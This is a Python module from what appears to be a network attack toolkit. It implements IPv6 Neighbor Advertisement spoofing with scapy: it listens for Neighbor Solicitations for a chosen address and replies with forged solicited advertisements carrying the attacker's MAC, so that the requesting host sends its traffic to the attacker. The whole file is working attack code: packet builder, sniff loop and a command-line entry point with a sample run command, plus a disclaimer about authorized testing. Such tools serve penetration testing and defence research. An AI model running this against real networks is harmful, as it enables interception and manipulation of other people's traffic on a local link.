"""Solicited Neighbor Advertisement spoofing: answer a host's Neighbor Solicitation with a forged NA.

A host that needs the link-layer address of an IPv6 address sends a Neighbor Solicitation (NS) for it and
waits for a Neighbor Advertisement (NA). A solicited NA (S flag set) is the reply to that NS. If the
attacker answers first, the requester records the attacker's MAC for the address.

Unlike NDP Cache Poisoning, which sends unsolicited NAs with the Override flag to replace entries that are
already valid, this module waits for the NS and replies with Override clear. A requester that has no valid
entry takes the first reply, and the real host's later reply does not replace it.

Intended only for networks you own or are explicitly authorized to test.

Run as a module inside the attacker's network namespace:
    ip netns exec atk python -m macabre.attacks.neighbor_advertisement_spoofing a1 --source-mac 02:00:00:00:00:30 --target 2001:db8:1::20
"""

from __future__ import annotations

import argparse
import sys
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp, sniff
from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6ND_NS, ICMPv6NDOptDstLLAddr, IPv6
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.ndp_cache_poisoning import validate_target

MAX_ANSWERS = 100
MIN_TIMEOUT = 0.5
MAX_TIMEOUT = 60.0


@dataclass(frozen=True)
class SolicitedAdvertisementConfig:
    iface: str                          # attacker interface, on the link where the target is solicited
    source_mac: str                     # the MAC the requester will record for the target (required)
    target: str = ""                    # the IPv6 address whose solicitations are answered (required)
    answers: int = 1                    # NAs sent, one per matching NS
    timeout: float = 10.0               # seconds to wait for a solicitation
    dry_run: bool = False               # listen and build replies, but do not send them

    def __post_init__(self) -> None:
        if not self.iface:
            raise ValueError("Interface is required.")
        normalize_unicast_mac(self.source_mac)
        if not self.target:
            raise ValueError("Target IPv6 address is required.")
        validate_target(self.target)
        if not 1 <= self.answers <= MAX_ANSWERS:
            raise ValueError(f"Answers must be between 1 and {MAX_ANSWERS}.")
        if not MIN_TIMEOUT <= self.timeout <= MAX_TIMEOUT:
            raise ValueError(f"Timeout must be between {MIN_TIMEOUT} and {MAX_TIMEOUT} seconds.")


@dataclass
class SolicitedAdvertisementStats:
    frames: int = 0
    status: str = ""


def is_solicitation_for(packet: Packet, target: str) -> bool:
    """A Neighbor Solicitation that asks for `target` from a unicast source. A DAD probe (source ::) is not a
    request for the address, so it is not answered here."""
    if not packet.haslayer(ICMPv6ND_NS) or not packet.haslayer(IPv6):
        return False
    if str(packet[ICMPv6ND_NS].tgt) != target:
        return False
    return str(packet[IPv6].src) != "::"


def build_solicited_advertisement(config: SolicitedAdvertisementConfig, solicitation: Packet) -> Packet:
    """The reply to one NS: a solicited NA (S set, O clear) from the target, unicast to the requester, with
    the operator's MAC in the Target Link-Layer Address option."""
    source = normalize_unicast_mac(config.source_mac)
    target = validate_target(config.target)
    return (
        Ether(src=source, dst=solicitation[Ether].src)
        / IPv6(src=str(target), dst=str(solicitation[IPv6].src), hlim=255)
        / ICMPv6ND_NA(tgt=str(target), R=0, S=1, O=0)
        / ICMPv6NDOptDstLLAddr(lladdr=source)
    )


def run_solicited_advertisement_spoofing(
    config: SolicitedAdvertisementConfig,
    stop_event: threading.Event,
    on_progress: Callable[[SolicitedAdvertisementStats], None],
    sniff_func: Callable[..., Any] | None = None,
    send: Callable[..., Any] | None = None,
) -> SolicitedAdvertisementStats:
    """Wait for NSs for `target` and answer up to `answers` of them, or stop at the timeout or `stop_event`."""
    if config.dry_run:
        stats = SolicitedAdvertisementStats(
            status=(f"Dry run: would answer up to {config.answers} Neighbor Solicitation(s) for {config.target} "
                    f"with {config.source_mac}. Nothing sent."),
        )
        on_progress(replace(stats))
        return stats

    sniff_func = sniff_func or sniff
    send = send or sendp
    stats = SolicitedAdvertisementStats()

    def answer(packet: Packet) -> None:
        if stats.frames >= config.answers or stop_event.is_set():
            return
        send(build_solicited_advertisement(config, packet), iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))

    def done(_packet: Packet) -> bool:
        return stop_event.is_set() or stats.frames >= config.answers

    sniff_func(
        iface=config.iface,
        lfilter=lambda p: is_solicitation_for(p, config.target),
        prn=answer,
        store=False,
        timeout=config.timeout,
        stop_filter=done,
    )
    stats.status = f"Answered {stats.frames} Neighbor Solicitation(s) for {config.target}."
    return stats


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Answer Neighbor Solicitations with forged solicited NAs.")
    parser.add_argument("iface")
    parser.add_argument("--source-mac", required=True)
    parser.add_argument("--target", required=True)
    parser.add_argument("--answers", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args(argv)
    config = SolicitedAdvertisementConfig(
        iface=args.iface, source_mac=args.source_mac, target=args.target,
        answers=args.answers, timeout=args.timeout,
    )
    stats = run_solicited_advertisement_spoofing(config, threading.Event(), lambda _s: None)
    print(stats.status, flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
